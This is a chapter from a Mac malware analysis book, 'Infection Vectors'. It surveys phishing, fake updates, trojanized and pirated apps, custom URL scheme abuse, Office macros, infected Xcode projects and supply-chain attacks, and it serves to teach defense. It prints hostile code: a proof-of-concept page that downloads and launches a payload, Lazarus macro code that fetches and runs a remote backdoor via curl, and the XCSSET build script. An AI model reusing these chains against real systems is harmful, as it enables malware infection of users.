<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" epub:prefix="index: http://www.index.com/" lang="en" xml:lang="en">
<head>
<title>Chapter 1: Infection Vectors</title>
<link href="NSTemplate_v1.css" rel="stylesheet" type="text/css"/>
<meta content="urn:uuid:a248aa67-aa2c-49b1-a34e-c916914c0e30" name="Adept.expected.resource"/>
</head>
<body epub:type="bodymatter chapter">
<section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" id="Page_3" title="3"/>1</span><br/>
<span class="ChapterTitle">Infection Vectors</span></h1>
</header>
<figure class="opener">
<img alt="" src="image_fi/book_art/chapterart.png"/>
</figure>
<p class="ChapterIntro">A malware’s infection vector is the means by which it gains access to a system. Throughout the years, malware authors have relied on mechanisms ranging from simple social engineering tricks to advanced, remote zero-day exploits to infect Macs. In this chapter, we’ll discuss many of the most common techniques used by Mac malware authors. </p>
<p>By far the most popular method of infecting Macs with malicious code involves tricking users into infecting themselves, generally by directly downloading and running the malicious code. (By contrast, techniques like remote exploitation are far less prevalent.) To achieve this, attackers often make use of common social engineering attacks, including tech-support scams, disseminating fake updates, fake applications, trojanized applications, and infected pirated applications. </p>
<p>Apple, of course, is keenly aware of macOS infection trends and the fact that the majority of such infections require explicit user interaction in <span epub:type="pagebreak" id="Page_4" title="4"/>order to succeed. In response, they have reactively introduced various operating system-level security mechanisms aimed at protecting Mac users. Let’s first briefly look at these <em>anti-infection</em> protection mechanisms before we dive into the details of specific macOS infection vectors.</p>
<h2 id="h1-501942c01-0001">Mac Protections</h2>
<p class="BodyFirst">Over time, Apple has sought to shore up the security of macOS, largely in an attempt to thwart user-assisted infection vectors. The oldest of these protection mechanisms, File Quarantine, was introduced in OS X Leopard (10.5). When a user first opens a downloaded item, File Quarantine provides a warning to the user that asks for explicit confirmation before allowing the file to execute; Apple’s documentation has advised users to click Cancel if they have doubts about the safety of a file.</p>
<p>To combat evolving malware infection vectors, Apple introduced Gatekeeper in OS X Mountain Lion (10.8). Built atop File Quarantine, Gatekeeper checks the code-signing information of downloaded items and blocks those that do not adhere to system policies. (For example, it checks that items are signed with a valid developer ID.) For a technical deep dive into Gatekeeper’s internals as well as some of its shortcomings, see my talk “Gatekeeper Exposed.”<sup class="endnote"><a href="#c01-endnote-1" id="c01-noteref-1">1</a></sup></p>
<p>Most recently, macOS Catalina (10.15) took yet another step at combatting user-assisted infections with the introduction of <em>application notarization</em> requirements. These requirements ensure that Apple has scanned and approved all software before it is allowed to run.<sup class="endnote"><a href="#c01-endnote-2" id="c01-noteref-2">2</a></sup> Though an excellent step at combatting basic macOS infection vectors, notarization is not infallible; malware authors have been quick to adapt. One simple notarization bypass leverages the fact that macOS still (as of Big Sur) allows unnotarized code to execute, albeit via manual user assistance. Malware such as older versions of Shlayer abuse this fact by simply instructing the user how to run the malicious unnotarized payload (<a href="#figure1-1" id="figureanchor1-1">Figure 1-1</a>).<sup class="endnote"><a href="#c01-endnote-3" id="c01-noteref-3">3</a></sup></p>
<figure>
<img alt="Webpage instructing user to 1) right-click the flashinstaller icon and press open and 2) click open on the pop-up to run the installer." class="keyline" src="image_fi/501942c01/f01001.png"/>
<figcaption><p><a id="figure1-1">Figure 1-1</a>: Instructions for a user-assisted notarization bypass (Shlayer)</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_5" title="5"/>More recent versions of Shlayer are far more insidious. In some cases, its authors successfully tricked Apple into notarizing their malicious creations.<sup class="endnote"><a href="#c01-endnote-4" id="c01-noteref-4">4</a></sup> Take a look at the output of macOS’s <code>spctl</code> tool, which here we use to display the code-signing information of Shlayer’s malicious application, <em>Installer.app</em> (<a href="#listing1-1" id="listinganchor1-1">Listing 1-1</a>):</p>
<pre><code>%<b> spctl -a -vvv -t install /Volumes/Install/Installer.app </b><br/>/Volumes/Install/Installer.app: accepted<br/><b>source=Notarized Developer ID</b><br/>origin=Developer ID Application: Morgan Sipe (4X5KZ42L4B)</code></pre>
<p class="CodeListingCaption"><a id="listing1-1">Listing 1-1</a>: Notarized malware (Shlayer)</p>
<p>The <code>source</code> field confirms it was inadvertently notarized by Apple. In subsequent chapters, we will discuss code-signing concepts and tools capable of extracting such code-signing information. </p>
<p>Unfortunately, other malware has been mistakenly notarized by Apple as well. And yes, though Apple eventually realizes its mistakes and revokes the developer ID of said malware to rescind the notarization, often it’s too late. </p>
<p>While the user-assisted infection vectors described in this chapter have unfortunately proven successful in the past, the latest version of macOS may often succeed in thwarting them, largely due to notarization requirements. Still, such infection vectors remain relevant, as users on older versions of macOS continue to be vulnerable, or as attackers continue to sidestep, receive inadvertent approval for, or exploit vulnerabilities in Apple’s stringent notarizing requirements. For an example of the latter, see my blog post, “All Your Macs Are Belong To Us: bypassing macOS’s file quarantine, gatekeeper, and notarization requirements.”<sup class="endnote"><a href="#c01-endnote-5" id="c01-noteref-5">5</a></sup></p>
<h2 id="h1-501942c01-0002">Malicious Emails</h2>
<p class="BodyFirst">When it comes to user-assisted infection vectors, the first challenge malware authors face is how to get the malware in front of the user in the first place. One proven approach is via email. Though the majority of users will likely disregard malicious emails, some may open them. But of course, unless the email contains some sophisticated exploit, simply opening an email won’t lead to infection.</p>
<p>Generally, attackers either directly send malware as an email attachment or include a URL that eventually leads to malicious code. In the former case, the body of the email may contain instructions that attempt to compel the user to open and run the attached malware. As a malicious attachment may masquerade as a harmless document, a user may be duped into opening it and inadvertently infecting themselves. </p>
<p>In 2017, researchers discovered a new kind of Mac malware that was targeting users in a widespread email campaign. Dubbed Dok, the malware would arrive in an email purporting to address inconsistencies in the targeted user’s tax returns. If the user opened the attachment (<em>Dokument.zip</em>) they would find a file with a name and icon designed to hide the fact that in reality it was a malicious application.<sup class="endnote"><a href="#c01-endnote-6" id="c01-noteref-6">6</a></sup></p>
<p><span epub:type="pagebreak" id="Page_6" title="6"/>As users and security tools often treat emails containing attachments with extra caution, malicious emails may instead include malicious links. Once opened, these links generally redirect to a malicious website that attempts to trick the user into downloading and running malicious code. In later sections in this chapter, we will cover various examples in which attackers used emails with malicious links as the initial step in a multi-step infection vector. </p>
<h2 id="h1-501942c01-0003">Fake Tech and Support </h2>
<p class="BodyFirst">Another excellent mechanism used to distribute malware is, of course, the internet. If you’re a Mac user, you’ve likely encountered malicious pop-ups as you’ve browsed the web. These pop-ups may originate from malicious ads on legitimate websites, hijacked or poisoned search results, or even unscrupulous websites that target unsuspecting users via <em>typosquatting</em>, a technique that involves registering malicious domains with names that match typos or variants of other popular sites. Still others may entice willing visitors with free content. More often than not, these pop-ups don’t install malicious files on their own; rather, they attempt to coerce users into infecting themselves. Often, this starts with a fake security alert or update. Let’s briefly look at an example of the former.</p>
<p>Homebrew, a popular package manager that facilitates the installation of software on macOS and Linux, is hosted at <em>brew.sh</em>. In 2020, cybercriminals typosquatted the domain <em>homebrew.sh</em> in the hopes that unsuspecting users would inadvertently visit this site instead. If they did, various prominently displayed pop-ups would proclaim the user’s system infected, saying it had been blocked “for security reasons” (<a href="#figure1-2" id="figureanchor1-2">Figure 1-2</a>).</p>
<figure>
<img alt="Various fake security alerts pop up from visiting the Mac website. Each pop-up tells the user that the computer has been infected with Trojan Spyware and asks the user to call mac support." class="keyline" src="image_fi/501942c01/f01002.png"/>
<figcaption><p><a id="figure1-2">Figure 1-2</a>: Fake security alerts (Shlayer)</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_7" title="7"/>Users who believed these alerts and called the supposed support number may have been coerced into installing malicious software, thus infecting their Macs. As Intego, a Mac security company, noted, this software would allow the attackers to “remotely access information on your computer and possibly compromise your system further.”<sup class="endnote"><a href="#c01-endnote-7" id="c01-noteref-7">7</a></sup></p>
<h2 id="h1-501942c01-0004">Fake Updates</h2>
<p class="BodyFirst">Attackers are also rather fond of abusing web-based pop-ups to display alerts for fake updates. You’ve likely come across modal browser pop-ups warning that your Adobe Flash Player is out of date. These pop-ups are usually malicious, linking to a download that, unsurprisingly, isn’t a legitimate Flash update but rather malicious software (<a href="#figure1-3" id="figureanchor1-3">Figure 1-3</a>).</p>
<figure>
<img alt="Three pop-ups alert the user that Adobe Flash Player is out of date and that downloading Flash is required to continue through the website." class="" src="image_fi/501942c01/f01003.png"/>
<figcaption><p><a id="figure1-3">Figure 1-3</a>: A fake Flash Player update (Shlayer)</p></figcaption>
</figure>
<p>Unfortunately, many Mac users still fall for this type of attack, believing the update to be required and infecting themselves, generally with adware, in the process.</p>
<h2 id="h1-501942c01-0005">Fake Applications</h2>
<p class="BodyFirst">Attackers are quite partial to targeting Mac users via fake applications. They’ll often attempt to trick the user into downloading and running a malicious application masquerading as something legitimate. Unlike trojanized applications (described later) that still provide the functionality of the original application so that nothing appears amiss, fake applications generally just execute a malicious payload and then exit. For example, Siggen targeted Mac users by impersonating the popular WhatsApp messaging application.<sup class="endnote"><a href="#c01-endnote-8" id="c01-noteref-8">8</a></sup> The attacker-controlled site <em>message-whatsapp.com</em> would deliver “a zip file with <span epub:type="pagebreak" id="Page_8" title="8"/>an application inside,” the security company Lookout explained in a tweet.<sup class="endnote"><a href="#c01-endnote-9" id="c01-noteref-9">9</a></sup> This downloaded ZIP archive, named <em>WhatsAppWeb.zip</em>, wasn’t the official WhatsApp application (surprise, surprise), but rather a malicious application named WhatsAppService. As the <em>message-whatsapp.com</em> site appeared legitimate (<a href="#figure1-4" id="figureanchor1-4">Figure 1-4</a>), the average user, failing to notice anything amiss, would download and run the fake application.</p>
<figure>
<img alt="The malicious message-whatsapp home page has options for downloading whatsapp on phones (left side of screen) and downloading whatsapp on a Mac or Windows PC (right side), with respective links. The top of the webpage lists WhatsApp Web, Features, Download, Security, and FAQ links." class="keyline" src="image_fi/501942c01/f01004.png"/>
<figcaption><p><a id="figure1-4">Figure 1-4</a>: The <em>message-whatsapp.com</em> homepage (Siggen)</p></figcaption>
</figure>
<h2 id="h1-501942c01-0006">Trojanized Applications</h2>
<p class="BodyFirst">Imagine you’re an employee of a popular cryptocurrency exchange who has just received an email requesting feedback on a new cryptocurrency trading application, JMTTrader. The link in the email takes you to a legitimate-looking company website, which prompts you to download what claims to be both the source code and prebuilt binary of the new application (<a href="#figure1-5" id="figureanchor1-5">Figure 1-5</a>).</p>
<figure>
<img alt="The JMT Trading homepage has a link to download it from GitHub on the left side, and a brief description of the application on the right side." class="keyline" src="image_fi/501942c01/f01005.png"/>
<figcaption><p><a id="figure1-5">Figure 1-5</a>: The JMTTrading homepage</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_9" title="9"/>After you’ve downloaded, installed, and run the application, still nothing appears amiss; as expected, you’re presented with a list of cryptocurrency exchanges and may select one in order to begin trading (<a href="#figure1-6" id="figureanchor1-6">Figure 1-6</a>).</p>
<figure>
<img alt="The JMT Trading application contains nine boxes identifying various cryptocurrency exchanges with their respective websites, including BitStamp, Bitfinex, and KCoin. The option to show more exchanges is a clickable box at the bottom left of the screen." class="" src="image_fi/501942c01/f01006.png"/>
<figcaption><p><a id="figure1-6">Figure 1-6</a>: A trojanized cryptocurrency trading application (Lazarus Group backdoor)</p></figcaption>
</figure>
<p>Unfortunately, although the source code for the application was pristine, the prebuilt installer for the <em>JMTTrader.app</em> had been surreptitiously trojanized with a malicious backdoor. During the installation process, this backdoor installed its own backdoor. This specific attack has been attributed to the infamous Lazarus APT Group, who have employed the same rather sophisticated, multifaceted social engineering approach to infect Mac users since 2018. For more details on this Lazarus Group attack, as well as their general propensity for this infection vector, see my blog post “<a class="LinkURL" href="https://objective-see.com/blog/blog_0x49.html">Pass the AppleJeus</a>.”<sup class="endnote"><a href="#c01-endnote-10" id="c01-noteref-10">10</a></sup></p>
<h2 id="h1-501942c01-0007">Pirated and Cracked Applications</h2>
<p class="BodyFirst">A slightly more sophisticated attack, although one that still requires a high degree of user interaction, involves packaging malware into cracked or pirated applications. In this attack scenario, malware authors will first crack popular commercial software, such as Photoshop, removing the copyright or licensing restrictions. Then they’ll inject malware into the software package before distributing it to the unsuspecting public. Users who download and run the cracked applications will then become infected. </p>
<p><span epub:type="pagebreak" id="Page_10" title="10"/>For instance, in 2014, malware called iWorm spread via pirated versions of desirable OS X applications such as Adobe Photoshop and Microsoft Office that attackers had uploaded to the popular torrent site The Pirate Bay, shown in <a href="#figure1-7" id="figureanchor1-7">Figure 1-7</a>. </p>
<figure>
<img alt="Pirate Bay site listing pirated versions of Adobe Photoshop, Parallels, and Microsoft Office for Mac." class="keyline" src="image_fi/501942c01/f01007.png"/>
<figcaption><p><a id="figure1-7">Figure 1-7</a>: Pirated applications (iWorm)</p></figcaption>
</figure>
<p>Users who installed these applications would indeed avoid paying for the software, but at the cost of an insidious infection. For more details on how iWorm persistently infected Mac users, see “<a class="LinkURL" href="https://www.virusbulletin.com/uploads/pdf/magazine/2014/vb201410-iWorm.pdf">Invading the core: iWorm’s infection vector and persistence mechanism</a>.”<sup class="endnote"><a href="#c01-endnote-11" id="c01-noteref-11">11</a></sup> </p>
<p>More recently, attackers distributed malware, known variously as BirdMiner and LoudMiner, via pirated applications on the VST Crack website. Thomas Reed, a well-known Mac malware analyst, noted that BirdMiner had been found in a cracked installer for the high-end music production software Ableton Live.<sup class="endnote"><a href="#c01-endnote-12" id="c01-noteref-12">12</a></sup> Moreover, the antivirus company ESET uncovered almost 100 other pirated applications related to digital audio and virtual studio technology that contained the BirdMiner malware.<sup class="endnote"><a href="#c01-endnote-13" id="c01-noteref-13">13</a></sup> Any user who downloaded and installed these pirated applications would infect their system with the malware.</p>
<h2 id="h1-501942c01-0008">Custom URL Schemes</h2>
<p class="BodyFirst">Malware authors are a wily and creative bunch. As such, they often creatively abuse legitimate macOS functionality in order to infect users. The WindTail malware is an instructive example of this.<sup class="endnote"><a href="#c01-endnote-14" id="c01-noteref-14">14</a></sup></p>
<p>WindTail infected Mac users by abusing various features of macOS, including Safari’s automatic opening of files deemed safe and the operating system’s registration of custom URL schemes. A <em>custom URL scheme</em> is a feature that one application can use to launch another. To infect Mac users, the malware authors would first coerce targets to visit a malicious web page, which would automatically download a ZIP archive containing the malware. If the target was using Safari, the browser would extract the archive automatically thanks to its Open “safe” files option, which is enabled by default (<a href="#figure1-8" id="figureanchor1-8">Figure 1-8</a>).</p>
<span epub:type="pagebreak" id="Page_11" title="11"/><figure>
<img alt="Safari’s General settings tab, with options to open Safari with specific windows, set the home page, remove history items and downloaded list items after a specified amount of time, save downloaded files to a specific folder, and open “safe” files after downloading." class="" src="image_fi/501942c01/f01008.png"/>
<figcaption><p><a id="figure1-8">Figure 1-8</a>: Safari’s Open “safe” files after downloading feature</p></figcaption>
</figure>
<p>This archive extraction is important, as macOS will automatically process any application as soon as it is saved to disk, which happens when it is extracted from an archive. This processing includes registering the application as a URL handler if the application supports any custom URL schemes.</p>
<p>To determine if an application supports custom URL schemes, you can manually examine its <em>Info.plist</em>, a file that contains metadata and configuration information about the application. An examination of WindTail’s <em>Info.plist</em> reveals that it supports a custom URL scheme: <code>openurl2622007</code> (<a href="#listing1-2" id="listinganchor1-2">Listing 1-2</a>): </p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;<br/>&lt;plist version="1.0"&gt;<br/>&lt;dict&gt;<br/>  ...<br/>  &lt;key&gt;CFBundleURLTypes&lt;/key&gt;<br/>  &lt;array&gt;<br/>    &lt;dict&gt;<br/>      &lt;key&gt;CFBundleURLName&lt;/key&gt;<br/>      &lt;string&gt;Local File&lt;/string&gt;<br/>      &lt;key&gt;CFBundleURLSchemes&lt;/key&gt;<br/>      &lt;array&gt;<br/>        &lt;string&gt;<b>openurl2622007</b>&lt;/string&gt;<br/>      &lt;/array&gt;<br/>    &lt;/dict&gt;<br/>  &lt;/array&gt;<br/>  ...<br/>&lt;/dict&gt;<br/>&lt;/plist&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing1-2">Listing 1-2</a>: An <em>Info.plist</em> file, containing a custom URL scheme <code>openurl2622007</code> (WindTail)</p>
<p><span epub:type="pagebreak" id="Page_12" title="12"/>Specifically note the presence of the <code>CFBundleURLTypes</code> array, which holds a list of URL schemes supported by WindTail. Within this list, we find a single entry describing the URL scheme, which includes a <code>CFBundleURLSchemes</code> array with the supported scheme: <code>openurl2622007</code>. After Safari automatically extracts the application, the macOS launch services daemon (<code>lsd</code>) will parse the application, extract any custom URL schemes, and register them in the launch services database. This database, <em>com.apple.LaunchServices-231-v2.csstore</em>, holds information such as application-to-URL scheme mappings. You can passively observe the daemon’s file actions via a file monitor such as macOS’s <code>fs_usage</code> (<a href="#listing1-3" id="listinganchor1-3">Listing 1-3</a>):</p>
<pre><code># <b>fs_usage -w -f filesystem</b><br/>open  (R_____)  ~/Downloads/Final_Presentation.app   lsd<br/>open  (R_____)  ~/Downloads/Final_Presentation.app/Contents/Info.plist   lsd<br/><br/>PgIn[A] /private/var/folders/pw/sv96s36d0qgc_6jh45jqmrmr0000gn/0/<br/>         com.apple.LaunchServices-231-v2.csstore   lsd</code></pre>
<p class="CodeListingCaption"><a id="listing1-3">Listing 1-3</a>: Observing the launch services daemon (<code>lsd</code>) file I/O events</p>
<p>In this output, you can see macOS’s built-in file monitor (<code>fs_usage</code>) capturing the launch services daemon (<code>lsd</code>), opening and parsing the malicious application, and accessing the launch services database (<em>com.apple.LaunchServices-231-v2.csstore</em>). Following this, if we print out the contents of the database via the <code>lsregister</code> command, we can see that a new entry now maps the malicious application, <em>Final_Presentation.app</em>, to the <code>openurl2622007</code> custom URL scheme (<a href="#listing1-4" id="listinganchor1-4">Listing 1-4</a>):</p>
<pre><code>% <b>/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/</b><br/><b>LaunchServices.framework/Versions/A/Support/lsregister -dump</b><br/><br/>BundleClass: kLSBundleClassApplication<br/>...<br/>path: ~/Downloads/Final_Presentation.app<br/>name: usrnode<br/><br/>claimed schemes:            openurl2622007:<br/>-------------------------------------------<br/>claim id:                   Local File (0xbee4)<br/>localizedNames:             "LSDefaultLocalizedValue" = "Local File"<br/>rank:                       Default<br/>bundle:                     usrnode (0x8c64)<br/>flags:                      url-type (0000000000000040)<br/>roles:                      Viewer (0000000000000002)<br/>bindings:                   openurl2622007:</code></pre>
<p class="CodeListingCaption"><a id="listing1-4">Listing 1-4</a>: WindTail (<em>Final_Presentation.app</em>), now registered as a custom URL handler </p>
<p>Now that the operating system has automatically registered the malware as the handler for the custom URL scheme <code>openurl2622007</code>, it can be launched directly from the malicious website. </p>
<p><span epub:type="pagebreak" id="Page_13" title="13"/>The proof-of-concept code in <a href="#listing1-5" id="listinganchor1-5">Listing 1-5</a> wholly mimics how WindTail would infect users once they visited its malicious site:</p>
<pre><code>&lt;html&gt;<br/><span aria-label="annotation1" class="CodeAnnotationHang">1</span> &lt;body id="b" onload="exploit();"&gt;&lt;/body&gt; <br/><br/>&lt;script type="text/javascript"&gt;<br/>  function exploit () {<br/>     var a = document.createElement("a");<br/>     var x = document.getElementById("b");<br/><br/>     a.setAttribute("href","https://foo.com/malware.zip");<br/>     a.setAttribute("download", "Final_Presentation");<br/>     x.appendChild(a);<br/><br/>   <span aria-label="annotation2" class="CodeAnnotationCode">2</span> a.click(); <br/><br/>     // wait for download and extraction to complete...<br/><br/>   <span aria-label="annotation3" class="CodeAnnotationCode">3</span> location.replace("openurl2622007://"); <br/>  }<br/><br/>&lt;/script&gt;<br/>&lt;/html&gt;</code></pre>
<p class="CodeListingCaption"><a id="listing1-5">Listing 1-5</a>: Downloading and launching WindTail via Safari (a proof of concept)</p>
<p>On page load <span aria-label="annotation1" class="CodeAnnotation">1</span>, this JavaScript code executes a programmatic click <span aria-label="annotation2" class="CodeAnnotation">2</span> to coerce Safari into automatically downloading a ZIP archive containing a malicious application with a custom URL scheme. Once downloaded, Safari will automatically extract the archive, triggering the registration of the custom URL scheme. Then, via the <code>location.replace</code> API, the exploit code makes a request to the (newly registered) custom URL scheme <span aria-label="annotation3" class="CodeAnnotation">3</span>, which triggers the launching of the malicious application!</p>
<p>Luckily for users, Safari and other browsers will display an alert notifying them that the web page is attempting to launch an application. Moreover, macOS may generate a second alert as the application actually launches. But since the attacker can name the application something innocuous (like <em>Final_Presentation</em>, as shown in <a href="#figure1-9" id="figureanchor1-9">Figure 1-9</a>), the average user may be tricked into clicking Allow and Open, thus infecting themselves.</p>
<figure>
<img alt="On opening OSX.WindTail.A Demo, a browser warning pops up asking, “Do you want to allow this page to open ‘Final_Presentation’?” with options to Cancel or Allow." class="keyline" src="image_fi/501942c01/f01009.png"/>
<figcaption><p><a id="figure1-9">Figure 1-9</a>: A browser warning . . . but is it enough?</p></figcaption>
</figure>
<h2 id="h1-501942c01-0009"><span epub:type="pagebreak" id="Page_14" title="14"/>Office Macros</h2>
<p class="BodyFirst">Although they are relatively unsophisticated, malicious documents containing Microsoft Office macros have become a popular method of infecting Mac users. <em>Macros </em>are simply commands that can be directly embedded into an Office document. Users can embed macros in Office documents for a variety of legitimate reasons, such as to automate common tasks. But malware authors can also abuse them to add malicious code to otherwise benign files. As macros are a Microsoft technology, they luckily remain unsupported in Apple’s suite of productivity tools (which includes Pages and Notes). But as macOS makes continued inroads into the enterprise, the popularity of Microsoft’s Office tool suite on macOS has surged as well. Hackers and malware authors are cognizant of this trend and thus macro-based attacks targeting Apple users are on the rise. For instance, the Lazarus APT Group launched a macro-based attack targeting Mac users in 2019.<sup class="endnote"><a href="#c01-endnote-15" id="c01-noteref-15">15</a></sup></p>
<p>For macro-based attacks to succeed, a user must open an infected Microsoft Office document in a Microsoft Office application, such as Word, and click the Enable Macros prompt (<a href="#figure1-10" id="figureanchor1-10">Figure 1-10</a>).</p>
<figure>
<img alt="Upon opening a document containing macros, Microsoft Office will launch a pop-up warning the user that macros might contain viruses, and confirming that the user would like to Enable Macros, Do Not Open, or Disable Macros." class="" src="image_fi/501942c01/f01010.png"/>
<figcaption><p><a id="figure1-10">Figure 1-10</a>: Microsoft Word’s macro warning</p></figcaption>
</figure>
<p>Usually written in Visual Basic for Applications (VBA), macro code generally invokes Microsoft APIs such as <code>AutoOpen</code> and <code>Document_Open</code> to ensure its malicious code will automatically execute once the document is opened and the user has enabled macros. </p>
<p>You can extract embedded macro code using a tool such as the <a class="LinkURL" href="https://github.com/decalage2/oletools/wiki/olevba">open-source </a><code>olevba</code><a class="LinkURL" href="https://github.com/decalage2/oletools/wiki/olevba"> utility</a>. For example, take a look at the following macro code (<a href="#listing1-6" id="listinganchor1-6">Listing 1-6</a>), found in a malicious Word document targeting South Korean users:</p>
<pre><code>% <b>olevba -c "샘플_기술사업계획서(벤처기업평가용.doc"</b><br/><br/>Sub AutoOpen()<br/> ...<br/><br/><span epub:type="pagebreak" id="Page_15" title="15"/>  #If Mac Then <span aria-label="annotation1" class="CodeAnnotationCode">1</span><br/>    sur = "https://nzssdm.com/assets/mt.dat" <span aria-label="annotation2" class="CodeAnnotationCode">2</span><br/> <br/>    spath = "/tmp/": i = 0 <span aria-label="annotation3" class="CodeAnnotationCode">3</span><br/>    Do<br/>      spath = spath &amp; Chr(Int(Rnd * 26) + 97): i = i + 1<br/>    Loop Until i &gt; 12<br/><br/>    res = system("curl -o " &amp; spath &amp; " " &amp; sur) <span aria-label="annotation4" class="CodeAnnotationCode">4</span><br/>    res = system("chmod +x " &amp; spath)<br/>    res = popen(spath, "r") <span aria-label="annotation5" class="CodeAnnotationCode">5</span></code></pre>
<p class="CodeListingCaption"><a id="listing1-6">Listing 1-6</a>: Malicious macro code (Lazarus Group backdoor)</p>
<p>The extracted Mac code contains Mac-specific logic within an <code>#If Mac Then</code> block <span aria-label="annotation1" class="CodeAnnotation">1</span>. This code first performs some initializations, including setting a variable with a remote URL <span aria-label="annotation2" class="CodeAnnotation">2</span> and dynamically building a random path within the <em>/tmp</em> directory <span aria-label="annotation3" class="CodeAnnotation">3</span>. Using <code>curl</code>, it then downloads the remote resource (<em>mt.dat</em>) to the randomly generated local path <span aria-label="annotation4" class="CodeAnnotation">4</span>. Once the item has downloaded, it invokes <code>chmod</code> to set the executable bit on the item and then executes it via the <code>popen</code> API <span aria-label="annotation5" class="CodeAnnotation">5</span>. This downloaded item is a persistent macOS backdoor. In <span class="xref" itemid="xref_target_Chapter 4">Chapter 4</span>, we’ll dive deeper into the details of analyzing malicious Office documents. </p>
<p>Since Office 2016, Microsoft Office applications on macOS run in a restrictive sandbox that seeks to constrict the impact of any malicious code. Still, in several instances, security researchers, including the author, have found trivial sandbox escapes. If you’re interested in reading more about macro-based attacks and sandbox escapes as a macOS infection vector, see my presentation “Documents of Doom: Infecting macOS via Office Macros.”<sup class="endnote"><a href="#c01-endnote-16" id="c01-noteref-16">16</a></sup></p>
<h2 id="h1-501942c01-0010">Xcode Projects</h2>
<p class="BodyFirst">Sometimes infection vectors are very targeted, as in the case of XCSSET. This malware sought to infect macOS developers via infected Xcode projects. <em>Xcode</em> is the de facto IDE for developing software for Apple devices. If an XCSSET-infected Xcode project is downloaded and built, the malicious code will be automatically run, and the developer’s Mac will be infected. TrendMicro, which discovered XCSSET, explains:</p>
<blockquote class="review">
<p class="Blockquote">These Xcode projects have been modified such that upon building, these projects would run a malicious code. This eventually leads to the main XCSSET malware being dropped and run on the affected system. Infected users are also vulnerable to having their credentials, accounts, and other vital data stolen.<sup class="endnote"><a href="#c01-endnote-17" id="c01-noteref-17">17</a></sup> </p></blockquote>
<p>Examining an Xcode project infected with XCSSET reveals a script in the project’s <em>project.pbxproj</em> file that executes another script, <em>Assets.xcassets</em>, from a hidden directory called <em>/.xcassets/</em> (<a href="#figure1-11" id="figureanchor1-11">Figure 1-11</a>).</p>
<span epub:type="pagebreak" id="Page_16" title="16"/><figure>
<img alt="Looking at the Assets Compiler within an Xcode project, we see a line of script that executes a hidden script." class="keyline" src="image_fi/501942c01/f01011.png"/>
<figcaption><p><a id="figure1-11">Figure 1-11</a>: Malicious build script in an infected Xcode project (XCSSET)</p></figcaption>
</figure>
<p>Building the infected project will trigger the execution of the scripts. Taking a peek at the <em>Assets.xcassets</em> script (<a href="#listing1-7" id="listinganchor1-7">Listing 1-7</a>) reveals it executes a binary named <em>xcassets</em>, which is the core component of the malware:</p>
<pre><code>cd "${PROJECT_FILE_PATH}/xcuserdata/.xcassets/"<br/>xattr -c "xcassets"<br/>chmod +x "xcassets"<br/>./xcassets "${PROJECT_FILE_PATH}" true%</code></pre>
<p class="CodeListingCaption"><a id="listing1-7">Listing 1-7</a>: Malicious build script <em>Assets.xcassets</em> (XCSSET)</p>
<p>Specifically, the script changes into the hidden <em>/.xcassets/</em> directory. Then it prepares the <em>xcassets</em> binary for execution by removing any extended attributes and setting the executable (<code>+x</code>) flag. Finally, the script executes the binary, passing in arguments such as the path to the project.</p>
<h2 id="h1-501942c01-0011">Supply Chain Attacks</h2>
<p class="BodyFirst">Another method of infecting target systems involves hacking legitimate developer or commercial websites that distribute third-party software. These so-called <em>supply chain attacks</em> are both highly effective and difficult to detect. For example, in mid-2017 attackers successfully compromised the official website of the popular video transcoder application HandBrake. With their access, they were able to subvert the legitimate transcoder application, repackaging it to contain a copy of their malware, called Proton.<sup class="endnote"><a href="#c01-endnote-18" id="c01-noteref-18">18</a></sup> </p>
<p>In 2018, another supply chain attack targeted the popular Mac application website <em>macupdate.com</em>. In this attack, hackers were able to modify the site by subverting download links to popular macOS applications, such as Firefox. Specifically, they modified the links to point to trojanized versions of the targeted applications containing malware known as CreativeUpdate (<a href="#figure1-12" id="figureanchor1-12">Figure 1-12</a>).<sup class="endnote"><a href="#c01-endnote-19" id="c01-noteref-19">19</a></sup></p>
<p>The majority of the attacks and infection vectors discussed so far in this chapter should be either fully or partially mitigated by the introduction of application notarization requirements in macOS 10.15+. As noted earlier, these requirements ensure that Apple has scanned and approved software before it is allowed to run on macOS. </p>
<p>Unfortunately, as we’ll discuss next, other avenues of infecting Mac systems still exist.</p>
<span epub:type="pagebreak" id="Page_17" title="17"/><figure>
<img alt="A modified version of macupdate.com, which tells the user that the newest version of Firefox has been validly signed. This web page contains details of the downloaded version of Firefox, such as the item type, hashes, and sign auth. The sign auth identifies the Developer ID Application: Ramos Jaxson. While we would expect to see the name Mozilla. This is a clear sign that something is wrong." class="" src="image_fi/501942c01/f01012.png"/>
<figcaption><p><a id="figure1-12">Figure 1-12</a>: Users who visited <em>macupdate.com</em> and downloaded and ran the trojanized applications may unfortunately have infected themselves—at no fault of their own, really.</p></figcaption>
</figure>
<h2 id="h1-501942c01-0012">Account Compromises of Remote Services</h2>
<p class="BodyFirst">On macOS, users can enable and configure various <em>externally facing</em> services, like RDP and SSH, to allow users to share content remotely or provide legitimate remote access to the system. However, if the services are misconfigured or protected with weak or compromised passwords, attackers may be able to gain access to the system, allowing them to execute their malicious code.</p>
<p>For many years, the notorious FruitFly malware’s infection vector remained a mystery. Then, in 2018, an FBI flash report provided insight into exactly how the malware was able to infect remote systems. The answer: compromising externally facing services. According to the report: </p>
<blockquote class="review">
<p class="Blockquote">The attack vector included the scanning and identification of externally facing services, to include the Apple Filing Protocol (AFP, port 548), RDP or other VNC, SSH (port 22), and Back to My Mac (BTMM), which would be targeted with weak passwords or passwords derived from third party data breaches.<sup class="endnote"><a href="#c01-endnote-20" id="c01-noteref-20">20</a></sup></p></blockquote>
<p>In 2020, attackers ported the IPStorm malware from Windows and Linux to macOS. IPStorm infects remote systems (including macOS systems with SSH enabled) by <em>brute-forcing</em> SSH accounts. Once it has guessed a valid username and password, it then downloads and executes a payload to the remote system.<sup class="endnote"><a href="#c01-endnote-21" id="c01-noteref-21">21</a></sup> <a href="#listing1-8" id="listinganchor1-8">Listing 1-8</a> is a snippet of IPStorm’s code containing the logic responsible for installing itself on remote systems:</p>
